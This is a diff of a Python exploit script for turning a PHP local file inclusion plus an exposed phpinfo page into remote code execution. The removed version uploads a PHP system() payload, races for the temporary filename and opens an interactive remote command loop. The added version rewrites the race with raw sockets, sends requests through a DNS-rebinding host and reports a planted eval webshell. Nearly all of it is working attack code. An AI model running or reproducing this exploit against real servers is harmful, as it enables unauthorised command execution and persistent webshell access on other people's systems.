@@ -1,130 +1,121 @@
-#!/usr/bin/python
-# LFI: PHPinfo to RCE exploit
-# Author: D35m0nd142
-# This is an improved remake of the original (perl) script written by Pashkela
-# The exploit assumes that the path to the phpinfo file you provided is correct. If it is not, it will not work.
-# Enter the website in this way: website /path.. you MUST NOT fill the gap between first and second string
+import os
 import socket
-import requests
-import os,sys,time
-import re
-
-# GLOBAL SETTINGS
-########################################################
-rcvbuf = 1024
-bigz = 3000
-junkheaders = 30
-junkfiles = 40
-junkfilename = '>' * 100000
-########################################################
-
-#######INIT
-host = ""
-path = ""
-###########
-
-def request(headers,cmd,path1,path,test):
-    z = "Z" * bigz
-    found = 0
-    headers = """POST %s HTTP/1.0\nHost: %s\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-us,en;q=0.5\nAccept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7\nz:%s\n""" %(path,host,z)
-    
-    loop = range(0,junkheaders)
-    for count in loop:
-        headers = headers+"z%d: %d\n" %(count,count)
-    
-    #print "\n%s\n" %headers
-    headers += """Content-Type: multipart/form-data; boundary=---------------------------59502863519624080131137623865\nContent-Length: """
-    
-    content = """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="tfile"; filename="test.html"\nContent-Type: text/html\n\n<?php system('echo AbracadabrA && %s'); ?>\n-----------------------------59502863519624080131137623865--""" %(cmd)
-    
-    loop = range(0,junkfiles)
-    for count in loop:
-        content = content + """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\nContent-Type: text/html\n\nno\n-----------------------------59502863519624080131137623865--\n""" %(count,count,junkfilename)
-    
-    headers = headers+str(len(content))+"\n\n%s" %(content)
-    
-    #print "[headers ready]"
-    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    #sys.stdout.write("[*] Sending request\t\t")
-    sock.connect((host,80))
-    #print "\n%s\n" %headers
-    sock.send(headers)
-    #print"[request sent]\n"
-    all_data = ""
-    running = 1
-    while "tmp_name" not in all_data:
-        #sys.stdout.write('.')
-        data = sock.recv(1024) # read 1024 byte chunks
-        all_data = all_data + data
-        
-        if("tmp_name" in all_data and "/tmp/php" in all_data):
-            found = 1
-            #sys.stdout.write("\n[+] Got filename: ")
-            fil = open("out.txt","w")
-            fil.write(all_data)
-            fil.close()
-            
-            for line in open("out.txt"):
-                if "tmp_name]" in line:
-                    #print line
-                    mystr = str(line)
-                    array = mystr.split()
-                    tmp_name = array[2]
-                    #print "%s" %tmp_name
-                    break
-        
-            tmp_url = "http://%s%s%s" %(host,path1,tmp_name)
-            #print "%s" %tmp_url
-            r = requests.get(tmp_url)
-            content = r.content
-            #print "%s\n" %content
-            ofile = open("out.txt","w")
-            ofile.write(content)
-            ofile.close()
-            os.system("./phpinfo_ext")
-            #print "%s\n" %content
-            break
-        
-        if("PHP License" in all_data):
-            break
-    
-    sock.close()
-    if (found == 1):
-        return 1
-    else:
-        return 0
-
-try:
-    if("php" in sys.argv[2]):
-        host = sys.argv[1]
-        path = sys.argv[2]
-    else:
-        print "[!] Can't extract host!\n"
-        sys.exit(1)
-except:
-    print "[!] You have not inserted any website to attack (maybe you forgot the path?) !\n"
-    sys.exit(1)
-
-path1 = raw_input("[*] Enter the vulnerable LFI path (ex: /lfi.php?file=../.. ) -> ")
-headers = ""
-cmd = "id"
-sys.stdout.write("\n[*] Generating the request.. wait please..\n")
-found = request(headers,cmd,path1,path,1)
+import sys
 
 
-if(found == 1):
-    print "\n[*] Opening a SYSTEM shell ..."
-    time.sleep(1)
-    cmd = "nope"
-    while(cmd != "exit" and cmd != "quit"):
-        cmd = raw_input("\n$> ")
-        request(headers,cmd,path1,path,0)
+tag = 'kingkk'
+PAYLOAD="""{}\r
+olokinho meu\r""".format(tag)
 
-    print "\n"
+UPLOAD="""-----------------------------7dbff1ded0714\r
+Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+{}
+-----------------------------7dbff1ded0714--\r""".format(PAYLOAD)
 
-else:
-    print "[!] The website is not vulnerable to this inclusion attack!\n"
-    sys.exit(1)
+padding="A" * 5000
+
+INFOREQ="""POST /phpinfo.php?a={padding} HTTP/1.1\r
+Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie={padding}\r
+HTTP_ACCEPT: {padding}\r
+HTTP_USER_AGENT: {padding}\r
+HTTP_ACCEPT_LANGUAGE: {padding}\r
+HTTP_PRAGMA: {padding}\r
+Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
+Content-Length: {len}\r
+Host: %s\r
+\r
+{upload}""".format(padding=padding, len=len(UPLOAD), upload=UPLOAD)
+
+LFIREQ="""GET //?%\F0%\9F%\87%B0%\F0%\9F%\87%B7%\F0%\9F%\90%\9F=http://36573657.26f0124b.rbndr.us/korea?a=%s HTTP/1.1\r
+User-Agent: Mozilla/4.0\r
+Proxy-Connection: Keep-Alive\r
+Host: %s\r
+\r
+\r
+"""
+
+class PHPINFO_LFI():
+	def __init__(self, host, port):
+		self.host = host
+		self.port = int(port)
+		self.req_payload= (INFOREQ % self.host).encode('utf-8')
+		self.lfireq = LFIREQ
+		self.offset = self.get_offfset()
 
 
+	def get_offfset(self):
+		'''
+		获取tmp名字的offset
+		'''
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((self.host, self.port))
 
+		s.send(self.req_payload)
+		page = b""
+		while True:
+			i = s.recv(4096)
+			page+=i        
+			if i == "":
+				break
+
+			if i.decode('utf8').endswith("0\r\n\r\n"):
+				break
+		s.close()
+
+		pos = page.decode('utf8').find("[tmp_name] =&gt; ")
+		print('get the offset :{} '.format(pos))
+
+		if pos == -1:
+			raise ValueError("No php tmp_name in phpinfo output")
+		
+		return pos+256 #多加一些字节
+
+	def phpinfo_lfi(self): 
+		'''
+		同时发送phpinfo请求与lfi请求
+		'''
+		phpinfo = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		lfi = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+
+		phpinfo.connect((self.host, self.port))
+		lfi.connect((self.host, self.port))
+
+		phpinfo.send(self.req_payload)
+
+		infopage = b"" 
+		while len(infopage) < self.offset:
+			infopage += phpinfo.recv(self.offset)
+
+		pos = infopage.decode('utf8').index("[tmp_name] =&gt; ")
+		tmpname = infopage[pos+17:pos+31]
+
+		lfireq = self.lfireq % (tmpname.decode('utf8'),self.host)
+		lfi.send(lfireq.encode('utf8'))
+
+		fipage = lfi.recv(4096)
+
+		phpinfo.close()
+		lfi.close()
+
+		if fipage.decode('utf8').find(tag) != -1:
+			return tmpname
+
+
+if __name__ == '__main__':
+	if len(sys.argv) < 4:
+		print('usage:\n\texp.py 127.0.0.1 80 500')
+		exit()
+	host = sys.argv[1]
+	port = sys.argv[2]
+	attempts = sys.argv[3]
+	print('{x}Start expolit {host}:{port} {attempts} times{x}'.format(x='*'*15, host=host, port=port, attempts=attempts))
+
+	p = PHPINFO_LFI(host,port)
+	for i in range(int(attempts)):
+		print('Trying {}/{} times…'.format(i, attempts), end="\r")
+		if p.phpinfo_lfi() is not None:
+			print('Getshell success! at /tmp/eval "<?=eval($_REQUEST[1])?>"')
+			exit()
+	print(':( Failed')
